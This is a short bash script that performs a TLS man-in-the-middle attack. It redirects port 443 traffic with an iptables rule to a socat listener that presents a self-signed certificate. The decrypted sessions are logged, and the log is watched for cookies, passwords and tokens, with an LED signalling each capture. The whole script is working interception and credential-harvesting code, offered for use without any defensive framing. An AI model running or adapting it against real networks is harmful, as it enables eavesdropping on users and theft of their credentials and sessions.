#!/bin/bash

echo '[*] SSL splitting'

[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 443) = '' ]] && {
	iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 443 -j REDIRECT --to-ports 1080
}

#[[ $(pgrep /usr/bin/sslsplit) = '' ]] && {
[[ $(pgrep /usr/bin/socat) = '' ]] && {
	if [ ! -s /tmp/key.pem -o ! -s /tmp/cert.pem -o ! -s /tmp/cert_key.pem ]; then
		openssl req -new -x509 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes -batch
		cat /tmp/cert.pem /tmp/key.pem > /tmp/cert_key.pem
	fi

	#screen -dmS sslsplit sslsplit -k /tmp/key.pem -c /tmp/cert.pem -l /tmp/con.log -L sslsplit.log -P autossl 0.0.0.0 1080
	#screen -dmS sslsplit 
	socat -v openssl-listen:1080,fork,cert=/tmp/cert_key.pem,cafile=/tmp/cert.pem,verify=0 open:sslsplit.log,creat,append 2> /dev/null &
}

tail -n 0 -f sslsplit.log | while read line
do
	echo "$line" | grep -ai -e cookie -e passw -e token --color=auto && led yellow on 2> /dev/null
done
